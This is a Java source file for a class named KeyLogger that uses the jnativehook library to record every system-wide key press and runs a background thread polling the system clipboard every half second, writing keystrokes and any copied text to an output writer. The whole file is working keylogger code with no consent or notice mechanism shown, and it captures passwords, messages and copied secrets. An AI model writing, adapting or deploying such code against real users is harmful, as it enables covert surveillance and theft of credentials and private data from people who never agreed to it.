package org.example;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.awt.*;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.Transferable;
import java.awt.datatransfer.UnsupportedFlavorException;
import java.io.IOException;
import java.io.PrintWriter;
import java.time.Duration;
import java.time.LocalTime;

public class KeyLogger implements NativeKeyListener {

    private final PrintWriter keyWriter;
    private static final Logger LOGGER = LoggerFactory.getLogger(KeyLogger.class);
    private String lastClipboardContent;
    private LocalTime lastTime=LocalTime.now();

    public KeyLogger(PrintWriter keyWriter) {
        this.keyWriter = keyWriter;
        startMonitoringClipboard();
    }
    private void startMonitoringClipboard() {
        lastClipboardContent = "";
        new Thread(() -> {
            while (true) {
                try {
                    String clipboardContent = getSysClipboardText();
                    if (clipboardContent != null && !clipboardContent.equals(lastClipboardContent)) {
                        lastClipboardContent = clipboardContent;

                        keyWriter.println("[CLIPBOARD]:" + clipboardContent+"\n");
                        keyWriter.flush();
                    }
                    Thread.sleep(500);
                } catch (Exception e) {
                    LOGGER.error(e.getMessage(), e);
                }
            }
        }).start();
    }

    public synchronized void nativeKeyPressed(NativeKeyEvent e) {
        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());

//        if (keyText.length() > 1) {
//            keyWriter.print(LocalTime.now()+": [" + keyText + "]\n");
//        } else {
//            keyWriter.print(LocalTime.now()+": "+keyText+"\n");
//        }
        Duration duration = Duration.between(lastTime,LocalTime.now());
        if(duration.getSeconds() > 0 || duration.getNano() > 1000_000_000){
            keyWriter.print("\n"+keyText);
        }
        else{
            keyWriter.print(keyText);
        }
        lastTime = LocalTime.now();

        keyWriter.flush();
    }

    public void nativeKeyReleased(NativeKeyEvent e) {
        // Nothing
    }

    public void nativeKeyTyped(NativeKeyEvent e) {
        // Nothing here
    }

    public static String getSysClipboardText() throws Exception {
        Clipboard sysClip = Toolkit.getDefaultToolkit().getSystemClipboard();
        // 获取剪切板中的内容
        Transferable clipTf = sysClip.getContents(null);
        if (clipTf == null) {
            return null;
        }
        // 检查内容是否是文本类型
        if (clipTf.isDataFlavorSupported(DataFlavor.stringFlavor)) {
            Object transferData = clipTf.getTransferData(DataFlavor.stringFlavor);
            if (transferData instanceof String) {
                return (String) transferData;
            }
        }
        return "";
    }
}